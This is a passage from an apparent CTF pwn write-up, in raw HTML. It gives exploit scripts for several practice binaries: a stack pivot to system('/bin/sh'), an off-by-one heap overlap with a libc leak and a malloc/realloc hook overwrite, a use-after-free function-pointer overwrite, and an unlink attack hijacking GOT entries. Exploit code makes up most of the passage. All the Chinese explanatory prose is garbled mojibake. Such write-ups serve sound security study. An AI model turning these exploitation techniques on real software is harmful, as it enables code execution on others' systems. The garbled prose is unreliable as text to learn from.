</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./libc.so.6&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free_hook</span> <span class=o>=</span> <span class=n>base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>one_gadget</span> <span class=o>=</span> <span class=n>base</span> <span class=o>+</span> <span class=mh>0x10a38c</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x28</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>remove</span><span class=p>(</span><span class=mi>18</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>remove</span><span class=p>(</span><span class=mi>18</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x28</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>free_hook</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x28</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>free_hook</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x28</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>one_gadget</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>remove</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=ciscn_2019_es_2>ciscn_2019_es_2</h3><p>åªèƒ½æº¢å‡º 8 å­—èŠ‚ï¼Œç©ºé—´å¤ªå°ï¼Œå› æ­¤è€ƒè™‘æ ˆè¿ç§»ã€‚å¦‚ä¸‹å¸ƒç½®æ ˆï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ret addr
</span></span><span class=line><span class=cl>ebp-0x2c
</span></span><span class=line><span class=cl>padding
</span></span><span class=line><span class=cl>/sh\x00
</span></span><span class=line><span class=cl>/bin
</span></span><span class=line><span class=cl>ebp-0x1c
</span></span><span class=line><span class=cl>padding
</span></span><span class=line><span class=cl>system
</span></span><span class=line><span class=cl>padding
</span></span><span class=line><span class=cl>ebp-0x24
</span></span><span class=line><span class=cl>padding
</span></span><span class=line><span class=cl>padding
</span></span></code></pre></td></tr></table></div></div><p>å¾—åˆ°ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s1>&#39;name?</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x28</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x28</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ebp</span> <span class=o>=</span> <span class=n>uu32</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>4</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;ebp&#39;</span><span class=p>,</span> <span class=n>ebp</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span><span class=p>,</span><span class=n>ebp</span><span class=o>-</span><span class=mh>0x24</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>4</span><span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>],</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>4</span><span class=p>,</span><span class=n>ebp</span><span class=o>-</span><span class=mh>0x1c</span><span class=p>,</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>4</span><span class=p>,</span><span class=n>ebp</span><span class=o>-</span><span class=mh>0x2c</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=roarctf_2019_easy_pwn>roarctf_2019_easy_pwn</h3><p>æœ¬é¢˜åœ¨ <code>write</code> æ—¶å­˜åœ¨ off_by_one æ¼æ´ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kr>__int64</span> <span class=kr>__fastcall</span> <span class=nf>sub_E26</span><span class=p>(</span><span class=kt>signed</span> <span class=kt>int</span> <span class=n>a1</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>a2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kr>__int64</span> <span class=n>result</span><span class=p>;</span> <span class=c1>// rax
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>a1</span><span class=o>&gt;</span> <span class=p>(</span><span class=kt>signed</span> <span class=kt>int</span><span class=p>)</span><span class=n>a2</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>a2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>a2</span> <span class=o>-</span> <span class=n>a1</span> <span class=o>==</span> <span class=mi>10</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>LODWORD</span><span class=p>(</span><span class=n>result</span><span class=p>)</span> <span class=o>=</span> <span class=n>a1</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span>
</span></span><span class=line><span class=cl>    <span class=n>LODWORD</span><span class=p>(</span><span class=n>result</span><span class=p>)</span> <span class=o>=</span> <span class=n>a1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>å¦‚æœç¼–è¾‘æ—¶è¾“å…¥çš„ <code>size</code> æ¯”åˆ›å»ºæ—¶çš„ <code>size</code> å¤§ 10ï¼Œå°±å¯ä»¥å¤šè¾“å…¥ä¸€ä¸ªå­—èŠ‚ã€‚è¿™å¤šå‡ºæ¥çš„ä¸€ä¸ªå­—èŠ‚å¯ä»¥è¦†ç›–åˆ°ä¸‹ä¸€ä¸ª chunk çš„ <code>chunk_size</code> å­—æ®µï¼Œä»è€Œä¿®æ”¹å…¶å¤§å°ï¼Œé€ æˆå †å—é‡å ã€‚</p><p>é¦–å…ˆè¿ç»­åˆ›å»º 5 ä¸ª <code>chunk</code>ï¼Œå…¶ä¸­ç¬¬ 0 ä¸ªçš„å¤§å°å¿…é¡»ä»¥ <code>8</code> ç»“å°¾ï¼Œå¦åˆ™åªèƒ½æº¢å‡ºåˆ° <code>prev_size</code> è€Œä¸æ˜¯ <code>chunk_size</code>ã€‚ç¼–è¾‘ 0 ä¸­æ•°æ®ï¼Œè§¦å‘ off_by_one æ¡ä»¶æº¢å‡ºä¿®æ”¹ 1 çš„å¤§å°ã€‚éšå <code>free(1)</code> ä½¿å…¶å¯¹åº”å¤§å°çš„ chunk è¿›å…¥ unsorted binï¼Œæ­¤æ—¶ 2 çš„ fd å³æŒ‡å‘ <code>main_arena+88</code>ï¼Œä»è€Œå¯ä»¥æ³„éœ² libcã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x58</span><span class=p>)</span> <span class=c1># 0</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>add</span><span class=p>(</span><span class=mh>0x60</span><span class=p>)</span> <span class=c1># 1</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x58</span><span class=o>+</span><span class=mi>10</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x58</span><span class=o>+</span><span class=s1>&#39;</span><span class=se>\xe1</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x60</span><span class=p>)</span> <span class=c1># 1</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span> <span class=c1># 2</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;content:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>main_arena</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>))</span> <span class=o>-</span> <span class=mi>88</span>
</span></span><span class=line><span class=cl><span class=n>base</span> <span class=o>=</span> <span class=n>main_arena</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__malloc_hook&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;base&#39;</span><span class=p>,</span> <span class=n>base</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>æ¥ä¸‹æ¥å…ˆç»•è¿‡ fastbin çš„å¤§å°æ£€æŸ¥ï¼Œéšåå‘ fd å†™å…¥ <code>malloc_hook</code> ä¸Šæ–¹çš„åœ°å€åç”³è¯·å›æ¥ï¼Œä»ç”³è¯·åˆ°çš„åœ°å€å‡ºå‘å¡«å…… 11 å­—èŠ‚åå³å¯ç”¨ <code>one_gadget</code> è¦†ç›– <code>__malloc_hook</code>ã€‚ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ <code>one_gadget</code> çš„çº¦æŸæ¡ä»¶å¾—ä¸åˆ°æ»¡è¶³ï¼Œå› æ­¤éœ€è¦å…ˆæ‰§è¡Œ <code>__libc_realloc</code> å¯¹ rsp è¿›è¡Œè°ƒæ•´ã€‚æœ€åç”¨ <code>one_gadget</code> è¦†ç›– <code>__realloc_hook</code>ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x60</span><span class=p>)</span> <span class=c1># 5 (2)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span> <span class=c1># bypass fastbin check</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>5</span><span class=p>,</span><span class=mh>0x8</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>main_arena</span><span class=o>-</span><span class=mh>0x33</span><span class=p>))</span> <span class=c1># above malloc_hook</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x60</span><span class=p>)</span> <span class=c1># 2</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x60</span><span class=p>)</span> <span class=c1># 6</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0xb</span><span class=p>,</span><span class=n>base</span><span class=o>+</span><span class=mh>0x4526a</span><span class=p>,</span><span class=n>base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;realloc&#39;</span><span class=p>]</span><span class=o>+</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>6</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>),</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x18</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=ciscn_2019_n_3>ciscn_2019_n_3</h3><p>æœ¬é¢˜ <code>do_new</code> å‡½æ•°å…ˆåˆ›å»º <code>0xc</code> çš„ chunkï¼ŒåŒ…å«å¡«å……çš„æ•°å­—ã€å¯¹æ•°å­—çš„æ‰“å°å‡½æ•°å’Œé‡Šæ”¾å‡½æ•°ï¼›è€Œå¦‚æœç”³è¯·çš„æ˜¯ <code>string</code> ç±»å‹ï¼Œä¸”é•¿åº¦ä¸è¶…è¿‡ <code>0x400</code> çš„è¯ï¼Œéšåè¿˜ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ chunkï¼ŒåŒ…å«å­—ç¬¦ä¸²å†…å®¹ã€å¯¹å­—ç¬¦ä¸²çš„æ‰“å°å‡½æ•°å’Œé‡Šæ”¾å‡½æ•°ã€‚</p><p>è€Œåœ¨ <code>do_del</code> ä¸­ï¼Œ<code>free</code> åæ²¡æœ‰æ¸…ç©ºæŒ‡é’ˆï¼Œå­˜åœ¨ uafã€‚å› æ­¤å¯ä»¥å…ˆç”³è¯·ä¸¤ä¸ªå †å—ï¼ˆæ€»å¤§å°å¤§äº <code>0xc</code>ï¼‰ç„¶åä¾æ¬¡é‡Šæ”¾ï¼Œå†ç”³è¯·ä¸€ä¸ªå¤§å°ä¸º <code>0xc</code> çš„å †å—ã€‚é‚£ä¹ˆæ­¤æ—¶å…ˆä¼šæ‹¿å‡º <code>chunk1</code> çš„ <code>0xc</code> è¿™ä¸€å—ï¼Œå†æ‹¿å‡º <code>chunk0</code> çš„ <code>0xc</code> è¿™ä¸€å—ï¼Œåè€…æ˜¯æˆ‘ä»¬å¯å†™çš„ã€‚</p><p>é€šè¿‡é€†å‘å¯çŸ¥ç»“æ„ä½“åç§» 0 å¤„æ˜¯æ‰“å°å‡½æ•°ã€åç§» 4 å¤„æ˜¯é‡Šæ”¾å‡½æ•°ï¼Œé‡Šæ”¾å‡½æ•°çš„å‚æ•°æ˜¯ç»“æ„ä½“æŒ‡é’ˆæœ¬èº«ã€‚é‚£ä¹ˆæˆ‘ä»¬å°† <code>chunk0</code> çš„æ‰“å°å‡½æ•°å†™æˆ <code>sh\x00\x00</code>ï¼ˆæ³¨æ„ 4 å­—èŠ‚ï¼‰ï¼Œé‡Šæ”¾å‡½æ•°ç”¨ <code>system</code> è¦†ç›–ï¼Œé‡Šæ”¾æ—¶å°±ä¼šæ‰§è¡Œ <code>system("sh")</code>ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>index</span><span class=p>,</span><span class=nb>len</span><span class=p>,</span><span class=n>content</span><span class=o>=</span><span class=s1>&#39;a&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>sla</span><span class=p>(</span><span class=s1>&#39;CNote&gt; &#39;</span><span class=p>,</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Index&gt; &#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Type&gt; &#39;</span><span class=p>,</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Length&gt; &#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=nb>len</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Value&gt; &#39;</span><span class=p>,</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>delete</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>sla</span><span class=p>(</span><span class=s1>&#39;CNote&gt; &#39;</span><span class=p>,</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Index&gt; &#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=mh>0xc</span><span class=p>,</span><span class=s1>&#39;sh</span><span class=se>\x00\x00</span><span class=s1>&#39;</span><span class=o>+</span><span class=n>p32</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=c1># 0xc from 1, then 0xc from 0</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=hitcon2014_stkof>hitcon2014_stkof</h3><p>æœ¬é¢˜å…±å››ä¸ªåŠŸèƒ½ï¼šæ·»åŠ ã€è¯»å…¥å†…å®¹ã€åˆ é™¤ã€æ˜¾ç¤ºã€‚å…¶ä¸­è¯»å…¥å†…å®¹å­˜åœ¨å †æº¢å‡ºï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªæº¢å‡ºå®ç° unlink æ”»å‡»ã€‚ç¨‹åºä¸­å­˜åœ¨å…¨å±€æ•°ç»„ <code>bag</code>ï¼Œå­˜æ”¾æ‰€æœ‰ chunk çš„ mem æŒ‡é’ˆã€‚</p><p>å…ˆç”³è¯· 3 ä¸ª chunkï¼Œå…¶ä¸­ç¬¬ 1 ä¸ª chunk æ²¡æœ‰ç”¨ï¼Œåªæ˜¯å› ä¸ºå‰ä¸¤ä¸ª chunk ä¸è¿ç»­æ‰€ä»¥æ‰ç”³è¯·çš„ã€‚éšåé€šè¿‡ chunk2 æº¢å‡ºåˆ° chunk3 è¿›è¡Œ unlink æ”»å‡»ï¼Œè¿™æ ·ä¿®æ”¹ <code>bag[2]</code> ç­‰ä»·äºä¿®æ”¹ <code>bag[-1]</code>ï¼Œå¡«å……æ‰ <code>bag[-1]</code> å’Œ <code>bag[0]</code> åï¼Œä»¤ï¼š</p><ul><li><code>bag[1] = elf.got['free']</code></li><li><code>bag[2] = elf.got['fflush']</code>ï¼Œ<code>fflush</code> å¯ä»¥æ˜¯ä»»æ„å·²è°ƒç”¨çš„ libc å‡½æ•°</li><li><code>bag[3] = elf.got['atoi']</code></li></ul><p>æ­¤æ—¶æˆ‘ä»¬ <code>edit(1)</code> å†™å…¥ <code>elf.plt['puts']</code> å³å¯åŠ«æŒ <code>free</code> å‡½æ•°åˆ° <code>puts</code>ï¼Œé‚£ä¹ˆè°ƒç”¨ <code>delete(2)</code> å°±ä¼šæ‰“å°å‡º <code>fflush</code> åœ°å€ï¼Œä»è€Œæ³„éœ² libcã€‚æœ€å <code>edit(3)</code> å†™å…¥ <code>system</code> åœ°å€ï¼ŒåŠ«æŒ <code>atoi</code> åˆ° <code>system</code>ï¼Œè¿™æ˜¯å› ä¸ºåœ¨ç¨‹åºè¯»å…¥æŒ‡ä»¤æ—¶ä¼šè°ƒç”¨ <code>atoi(&nptr)</code>ï¼Œæˆ‘ä»¬è¾“å…¥çš„ <code>nptr</code> åªéœ€è¦æ˜¯ <code>/bin/sh</code> å³å¯ getshellã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>size</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>sl</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>sl</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=n>ru</span><span class=p>(</span><span class=s1>&#39;OK</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>delete</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>sl</span><span class=p>(</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>sl</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>index</span><span class=p>,</span><span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>sl</span><span class=p>(</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>sl</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=n>sl</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>content</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>	<span class=n>s</span><span class=p>(</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>ru</span><span class=p>(</span><span class=s1>&#39;OK</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>bag</span> <span class=o>=</span> <span class=mh>0x602140</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x80</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x80</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x80</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fd</span> <span class=o>=</span> <span class=n>bag</span><span class=o>+</span><span class=mh>0x10</span><span class=o>-</span><span class=mh>0x18</span>
</span></span><span class=line><span class=cl><span class=n>bk</span> <span class=o>=</span> <span class=n>bag</span><span class=o>+</span><span class=mh>0x10</span><span class=o>-</span><span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x80</span><span class=p>,</span><span class=n>fd</span><span class=p>,</span><span class=n>bk</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x80</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>flat</span><span class=p>(</span><span class=mh>0x80</span><span class=p>,</span><span class=mh>0x90</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># bag[2] &lt;-&gt; bag[-1]</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x10</span><span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;free&#39;</span><span class=p>],</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;fflush&#39;</span><span class=p>],</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;atoi&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span> <span class=c1># puts(GOT[fflush])</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;OK</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
